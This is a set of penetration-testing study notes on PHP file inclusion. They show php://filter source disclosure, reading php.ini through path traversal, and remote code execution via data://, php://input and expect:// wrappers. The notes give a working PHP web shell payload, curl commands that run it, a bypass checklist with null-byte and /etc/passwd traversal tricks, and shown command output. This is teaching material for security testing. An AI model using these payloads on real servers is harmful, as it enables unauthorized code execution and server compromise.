# File Inclusion
- **PHP Filters**
    - PHP Filters are a type of PHP wrappers, where we can pass different types of input and have it filtered by the filter we specify.
    - To use PHP wrapper streams, we can use the php:// scheme in our string, and we can access the PHP filter wrapper with php://filter/.

    - Source Code Disclosure:
    ```url
    php://filter/read=convert.base64-encode/resource=config
    ```

## PHP Wrappers    
### 1. Data
- The data wrapper can be used to include external data, including PHP code. 
- However, the data wrapper is only available to use if the (allow_url_include) setting is enabled in the PHP configurations.
- **Checking PHP Configurations**
    - To do so, we can include the PHP configuration file found at (`/etc/php/X.Y/apache2/php.ini`) for Apache or at (`/etc/php/X.Y/fpm/php.ini`) for Nginx, where X.Y is your install PHP version. 
    - We can start with the latest PHP version, and try earlier versions if we couldn't locate the configuration file.
    ```bash
    curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
    ```
    - Once we have the base64 encoded string, we can decode it and grep for allow_url_include to see its value:
    ```bash
    echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include

    allow_url_include = On
    ```
- **Remote Code Execution**
    - With allow_url_include enabled, we can proceed with our data wrapper attack. 
    - As mentioned earlier, the data wrapper can be used to include external data, including PHP code.
    - First step would be to base64 encode a basic PHP web shell, as follows:
    ```bash
    echo '<?php system($_GET["cmd"]); ?>' | base64

    PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
    ```
    - Now, we can URL encode the base64 string, and then pass it to the data wrapper with `data://text/plain;base64,`. Finally, we can use pass commands to the web shell with `&cmd=<COMMAND>`:
    ```bash
    curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid
            uid=33(www-data) gid=33(www-data) groups=33(www-data)
    ```

### 2. Input
- Similar to the data wrapper, the input wrapper can be used to include external input and execute PHP code. 
- The difference between it and the data wrapper is that we pass our input to the input wrapper as a POST request's data. 
- So, the vulnerable parameter must accept POST requests for this attack to work.
```bash
curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
            uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

> [!NOTE]
> To pass our command as a GET request, we need the vulnerable function to also accept GET request (i.e. `use $_REQUEST`). If it only accepts POST requests, then we can put our command directly in our PHP code, instead of a dynamic web shell (e.g. `<\?php system('id')?>`)

### 3. Expect
- Finally, we may utilize the expect wrapper, which allows us to directly run commands through URL streams.
- However, expect is an external wrapper, so it needs to be manually installed and enabled on the back-end server, though some web apps rely on it for their core functionality, so we may find it in specific cases.
- We can determine whether it is installed on the back-end server just like we did with allow_url_include earlier, but we'd grep for expect instead, and if it is installed and enabled we'd get the following:
```bash
echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep expect
extension=expect
```
- To use the expect module, we can use the expect:// wrapper and then pass the command we want to execute, as follows:
```bash
curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```




## Testing 
- Bypasses
    - [ ] Check non-recursive path traversal filters
    - [ ] Try list of path traversal payloads (Encoding, path truncation)
    - [ ] Check for appended extension e.g. .php, .aspx
    - [ ] Try Null byte `%00` , fragment `#` (/etc/passwd%00.php)
